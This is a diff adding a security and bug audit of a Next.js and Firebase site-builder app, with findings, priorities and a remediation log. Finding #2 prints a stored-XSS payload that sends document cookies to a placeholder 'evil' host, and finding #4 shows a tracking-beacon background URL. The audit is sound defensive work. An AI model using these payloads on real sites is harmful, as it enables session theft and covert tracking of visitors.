@@ -1,0 +1,322 @@
+===========================================================================
+ SECURITY & BUG AUDIT — Mega (megadevs.site)
+ Date: 2026-10-08
+ Scope: Next.js app (app/, lib/, middleware.ts, config files)
+ STATUS: Findings have now been REMEDIATED in code — see
+         "REMEDIATION STATUS" at the bottom for what changed and the
+         operational steps you must still run (deploy rules, set CORS, etc.).
+===========================================================================
+
+Stack summary: Next.js (App Router) + Firebase (Firestore client SDK) +
+Cloudinary (unsigned uploads). Public pages are server-rendered from
+Firestore docs in the `profiles` and `sites` collections. Users edit their
+own profile (/dashboard) and build sites (/builder). Subdomains are routed
+by middleware.ts; the per-user site is rendered at app/[subdomain]/page.tsx
+and app/site/[slug]/[[...page]]/page.tsx.
+
+---------------------------------------------------------------------------
+ SEVERITY LEGEND:  [CRITICAL] [HIGH] [MEDIUM] [LOW]
+---------------------------------------------------------------------------
+
+
+===========================================================================
+ SECURITY ISSUES
+===========================================================================
+
+---------------------------------------------------------------------------
+[CRITICAL] 1. No Firestore security rules in repo — authorization is
+             client-side only; any authenticated user can overwrite any
+             profile/site (account/subdomain takeover + defacement).
+---------------------------------------------------------------------------
+Where:
+  - app/dashboard/page.tsx  (setDoc on "profiles/{subdomain}", writes
+                             `uid: user.uid` from the client)
+  - app/builder/page.tsx    (setDoc on "sites/{slug}", same pattern)
+  - No firestore.rules / firestore.indexes.json committed anywhere.
+
+Problem:
+  The document ID is the user-chosen subdomain/slug, NOT the uid. The only
+  thing tying a doc to its owner is a client-supplied `uid` field. All
+  "is this mine / is this taken" logic lives in client JavaScript
+  (getDoc existence checks, the `isEditing`/`isExisting` flags).
+
+  Client checks are trivially bypassed — an attacker can call the Firestore
+  SDK (or REST API) directly with the public config in lib/firebase.ts.
+  If the project's Firestore rules are the common permissive defaults —
+  e.g. `allow read, write: if true;` or `if request.auth != null;` — then
+  ANY logged-in user can:
+     * overwrite someone else's profile at profiles/<victim-subdomain>
+       (setDoc merge, line ~245) and set uid to their own,
+     * overwrite/deface any published site at sites/<victim-slug>,
+     * read every document in both collections.
+
+  The "subdomain already taken" guard (dashboard line ~196, builder
+  line ~291) does NOT protect anyone — it only runs for new docs in the
+  attacker's browser and can be skipped entirely.
+
+Impact: Full takeover / defacement of any user's public page; mass data
+  read of all profiles (emails, phone numbers — see #8).
+
+Required fix direction (NOT applied): Commit Firestore rules that enforce
+  ownership server-side, e.g. write allowed only when
+  `request.auth.uid == resource.data.uid` (and on create,
+  `request.resource.data.uid == request.auth.uid`). Verify the deployed
+  rules — they cannot be audited from this repo because they are not here.
+
+
+---------------------------------------------------------------------------
+[HIGH] 2. Stored XSS via `javascript:` (and `data:`) URIs in user-supplied
+          link URLs rendered into <a href> on public pages.
+---------------------------------------------------------------------------
+Where (all render an attacker-controlled URL straight into href with no
+scheme validation):
+  - app/components/PremiumProfileCard.tsx
+        line ~761  href={link.url}        (customLinks[].url)
+        lines ~111-118  telegram/whatsapp/instagram/facebook/github hrefs
+        (Btn component, line ~847, renders href as-is)
+  - app/components/CanvasElementView.tsx
+        line ~151  <a href={p.href}>      (builder "button" element)
+  - app/components/pro/LinkCard.tsx
+        lines ~79/84  href={node.href}
+  - app/[subdomain]/page.tsx & app/site/[slug]/.../page.tsx are
+    server-rendered and PUBLIC, so these links ship to every visitor.
+
+Problem:
+  A profile/site owner (or anyone exploiting #1) can store
+  `javascript:fetch('//evil/'+document.cookie)` (or similar) as a link URL.
+  React does NOT sanitize `href`; when a visitor clicks the link the script
+  runs in the megadevs.site origin → session/data theft, drive-by actions.
+  The `<input type="url">` controls do not reliably block the `javascript:`
+  scheme, and data can be written to Firestore directly anyway (see #1),
+  bypassing the form entirely.
+
+Impact: Stored XSS affecting every visitor of a crafted page.
+
+Fix direction (NOT applied): Allow-list URL schemes (http, https, mailto,
+  tel) before rendering; reject/normalize anything else. Apply in the
+  shared render path (Btn, ElementContent, LinkCard).
+
+
+---------------------------------------------------------------------------
+[MEDIUM] 3. No Content-Security-Policy header (would blunt the XSS in #2).
+---------------------------------------------------------------------------
+Where: netlify.toml [[headers]] block.
+Problem: Sets HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy
+  and Permissions-Policy, but NO `Content-Security-Policy`. A CSP (script-src
+  without 'unsafe-inline' for navigations, etc.) would reduce the blast
+  radius of the stored-XSS vectors above. Note the many inline <style> blocks
+  and inline event usage will require care when adding one.
+
+
+---------------------------------------------------------------------------
+[MEDIUM] 4. CSS injection / visitor tracking via unvalidated background
+            image URLs interpolated into inline `url(...)`.
+---------------------------------------------------------------------------
+Where:
+  - app/[subdomain]/page.tsx  line ~56  backgroundImage: `url(${profile.customBgUrl})`
+  - app/site/[slug]/.../page.tsx line ~65  `url(${current.bgImageUrl})`
+  - app/builder/page.tsx (preview) and dashboard preview do the same.
+Problem: The URL comes from Firestore (user/attacker controlled) and is
+  injected verbatim into a style string. At minimum an attacker can point it
+  at `url(https://evil.com/px.png)` so every visitor silently beacons their
+  IP/User-Agent to a third party. Depending on how the value is parsed it can
+  also smuggle extra CSS. No validation that the value is an https image URL.
+
+
+---------------------------------------------------------------------------
+[MEDIUM] 5. Wide-open Storage CORS + unsigned Cloudinary uploads = anonymous
+            upload / resource abuse.
+---------------------------------------------------------------------------
+Where:
+  - cors.json: origin ["*"] with GET/HEAD/PUT/POST/DELETE.
+  - app/dashboard/page.tsx (~205-242) & app/builder/page.tsx
+    (uploadToCloudinary, ~42-54): unsigned upload preset, cloud name in
+    NEXT_PUBLIC_* env.
+Problem: An unsigned Cloudinary preset + public cloud name means anyone (no
+  auth) can POST arbitrary images to your Cloudinary account — storage/
+  bandwidth cost abuse and hosting of arbitrary/abusive content under your
+  account. The `origin: ["*"]` CORS on the bucket allows any site to call
+  these endpoints. Expected for "unsigned" uploads, but it is an abuse
+  surface worth rate-limiting / moving to signed uploads or a server proxy.
+
+
+---------------------------------------------------------------------------
+[MEDIUM] 6. Reserved-route collision via subdomain → path rewrite
+            (phishing / route shadowing).
+---------------------------------------------------------------------------
+Where: middleware.ts (rewrite to `/${subdomain}${path}`).
+Problem: The subdomain is turned directly into the first path segment with
+  no reserved-name list. A user who registers the subdomain `dashboard`,
+  `builder`, `login`, `works`, `history`, or `palestine` causes
+  e.g. dashboard.megadevs.site to rewrite to `/dashboard` — the REAL app
+  dashboard — rather than their profile. This lets an attacker serve the
+  genuine login/dashboard UI under a subdomain they "own", enabling
+  convincing phishing, and generally shadows app routes.
+  Recommend a reserved-subdomain deny-list (and the same for site slugs).
+
+
+---------------------------------------------------------------------------
+[LOW] 7. Host header trusted + non-null assertion in middleware.
+---------------------------------------------------------------------------
+Where: middleware.ts  `let hostname = req.headers.get("host")!;`
+Problem: Subdomain routing is derived entirely from the client-supplied Host
+  header. In environments where Host can be spoofed this controls which
+  Firestore doc is rendered. The `!` non-null assertion will also throw if
+  the header is ever absent. Validate/normalize host and handle the null
+  case.
+
+
+---------------------------------------------------------------------------
+[LOW] 8. PII exposure of all profiles (phone, email) given #1.
+---------------------------------------------------------------------------
+Where: `profiles` docs store phone, gmail, socials; rendered publicly and
+  (per #1) likely readable in bulk.
+Problem: Even by design the public page exposes phone/email; combined with
+  permissive read rules, the entire user base's contact PII is enumerable.
+  Confirm read rules and consider whether full docs should be world-readable.
+
+
+===========================================================================
+ BUGS (non-security, or reliability)
+===========================================================================
+
+---------------------------------------------------------------------------
+[HIGH-BUG] 9. Netlify static-export config is incompatible with the app's
+              use of middleware + dynamic server data + ISR.
+---------------------------------------------------------------------------
+Where: netlify.toml -> `publish = "out"` (the `out/` dir is produced only by
+  Next static export / `output: 'export'`).
+Problem: The app relies on:
+   * middleware.ts (subdomain rewriting) — NOT supported by static export,
+   * server components that call Firestore `getDoc` at request time
+     (app/[subdomain]/page.tsx, app/site/[slug]/.../page.tsx),
+   * `export const revalidate = 60/30` (ISR) — not supported by static export.
+  Publishing `out/` would break subdomain routing and dynamic profile
+  rendering. The publish target and the app's rendering model disagree;
+  verify the actual Netlify adapter/build output.
+
+
+---------------------------------------------------------------------------
+[MEDIUM-BUG] 10. React state mutation in custom-link editing.
+---------------------------------------------------------------------------
+Where: app/dashboard/page.tsx  handleCustomLinkChange (~148-152):
+     const newLinks = [...formData.customLinks];
+     newLinks[index][field] = value;     // mutates the SAME nested object
+Problem: The spread makes a shallow copy of the array but the element objects
+  are the same references, so `newLinks[index][field] = value` mutates the
+  existing state object in place. This can cause missed re-renders / stale
+  live-preview and subtle "my edit didn't show up" bugs. Build a new object
+  for the changed row instead.
+
+
+---------------------------------------------------------------------------
+[LOW-BUG] 11. `profile.name.charAt(0)` assumes name is always present.
+---------------------------------------------------------------------------
+Where: app/components/PremiumProfileCard.tsx (~734) avatar initial.
+Problem: On the public server-rendered page the component trusts
+  `profile.name` to be a non-empty string. A malformed/legacy Firestore doc
+  with a missing name throws at render (crashes the page). Guard with an
+  optional-chain / fallback.
+
+
+---------------------------------------------------------------------------
+[LOW-BUG] 12. `user!.uid` non-null assertions in async save handlers.
+---------------------------------------------------------------------------
+Where: dashboard handleSubmit (~246) and builder save (~298) use `user!.uid`.
+Problem: If the auth state flips to null between load and submit (token
+  expiry, sign-out race), these throw instead of failing gracefully. Prefer
+  an explicit null check that aborts the save with a friendly message.
+
+
+---------------------------------------------------------------------------
+[LOW-BUG] 13. Subdomain/slug sanitization strips chars but allows empty /
+              leading-trailing hyphens and reserved names.
+---------------------------------------------------------------------------
+Where: dashboard (~185) and builder (~283) do
+       `.toLowerCase().replace(/[^a-z0-9-]/g, "")`.
+Problem: Produces values like `---` or `-abc-`, or an empty string pre-check
+  that then relies on other guards. No max length, no reserved-name check
+  (see #6). Minor correctness/UX, and feeds the collision issue above.
+
+
+===========================================================================
+ NOTES / NON-ISSUES (checked, considered acceptable)
+===========================================================================
+ - lib/firebase.ts exposes NEXT_PUBLIC_FIREBASE_* config. This is EXPECTED
+   for Firebase web apps; the apiKey is an identifier, not a secret. The real
+   boundary is Firestore/Storage security rules (see #1) — THAT is what must
+   be correct.
+ - .env* is correctly gitignored; no secret/env files are tracked in git.
+ - Static marketing/history pages (app/history, app/works, app/page.tsx)
+   render only hard-coded content — no injection surface there.
+
+===========================================================================
+ TOP PRIORITIES (in order)
+===========================================================================
+   1. Verify & commit strict Firestore security rules (ownership-enforced). (#1)
+   2. Allow-list URL schemes before rendering any user link href.          (#2)
+   3. Reconcile the Netlify static-export vs. middleware/SSR mismatch.      (#9)
+   4. Add a CSP + validate background/image URLs.                     (#3, #4)
+   5. Reserve app route names as forbidden subdomains/slugs.               (#6)
+===========================================================================
+
+
+===========================================================================
+ REMEDIATION STATUS  (added 2026-10-08)
+===========================================================================
+
+FIXED IN CODE:
+ #1  CRITICAL — Firestore authorization. Added firestore.rules (+ firebase.json,
+     firestore.indexes.json, storage.rules). Writes to profiles/sites now
+     require request.auth.uid == doc.uid on create AND update; reads stay
+     public (needed for SSR). Default-deny on all other collections.
+ #2  HIGH — Stored XSS. New app/lib/sanitizeUrl.ts (safeUrl) allow-lists
+     http/https/mailto/tel + relative links and neutralizes javascript:/data:
+     etc. Applied in PremiumProfileCard (Btn), CanvasElementView (button),
+     pro/LinkCard and pro/Nav.
+ #3  MEDIUM — CSP. netlify.toml now sends a Content-Security-Policy.
+ #4  MEDIUM — CSS injection. safeBgUrl() validates http(s) + rejects url()
+     breakout chars; applied in [subdomain]/page.tsx and site/[slug] page.
+ #5  MEDIUM — Storage CORS/uploads. cors.json narrowed to megadevs.site origins
+     and GET/HEAD only; storage.rules denies all writes (uploads use Cloudinary).
+     (See REMAINING for the Cloudinary preset hardening.)
+ #6  MEDIUM — Reserved-route collision. app/lib/reserved.ts deny-list enforced
+     in middleware, dashboard and builder.
+ #7  LOW — Host header. middleware handles a missing Host header (no more `!`).
+ #9  HIGH-BUG — Netlify static/SSR mismatch. netlify.toml drops `publish=out`
+     and uses @netlify/plugin-nextjs so middleware/SSR/ISR work.
+ #10 MEDIUM-BUG — State mutation in handleCustomLinkChange: now immutable.
+ #11 LOW-BUG — profile.name.charAt(0) guarded (`?.charAt(0) || "?"`).
+ #12 LOW-BUG — user! assertions replaced with explicit sign-in guards in
+     dashboard and builder save handlers.
+ #13 LOW-BUG — cleanSlug() collapses/trims hyphens + caps length (63).
+
+NEW FEATURE — RATE LIMITING (requested):
+ * 50 requests / 60s per IP — middleware.ts in-memory sliding window -> 429.
+ * 5 saves / account / 24h — app/lib/rateLimit.ts (addQuotaWrite) + a
+   rateLimits/{uid} counter written in the SAME batch as the profile/site
+   write. firestore.rules enforce it server-side: the counter may advance at
+   most +1 per write and reset only after a real 24h (anchored to
+   request.time), and every profile/site write must carry a fresh counter
+   bump (getAfter), so content writes are hard-capped at 5 per 24h.
+
+REMAINING — OPERATIONAL STEPS (cannot be done from the repo):
+ a) DEPLOY the rules — they are inert until pushed:
+        firebase deploy --only firestore:rules,storage:rules
+    Then test in the Firebase console Rules Playground / emulator.
+ b) APPLY the bucket CORS you just narrowed:
+        gsutil cors set cors.json gs://<your-bucket>
+ c) Install the Netlify Next plugin if not auto-detected:
+        npm i -D @netlify/plugin-nextjs
+ d) Cloudinary (#5): move to SIGNED uploads or a server proxy + enable
+    rate-limiting on the account; the unsigned preset still allows anonymous
+    uploads by design.
+ e) #8 PII: reads remain public by necessity (SSR with the client SDK).
+    If contact PII should not be world-readable, render profiles via a
+    server with the Admin SDK and tighten read rules.
+ f) Clock skew: the 5/24h rule rejects client timestamps more than 5 min from
+    server time; fine for normal devices, documented in firestore.rules.
+
+NOTE: For a strict GLOBAL 50/60s limit across many edge instances, back the
+ middleware limiter with a shared store (e.g. Upstash Redis). The current
+ in-memory limiter is per-instance (hard limit on single-instance deploys).
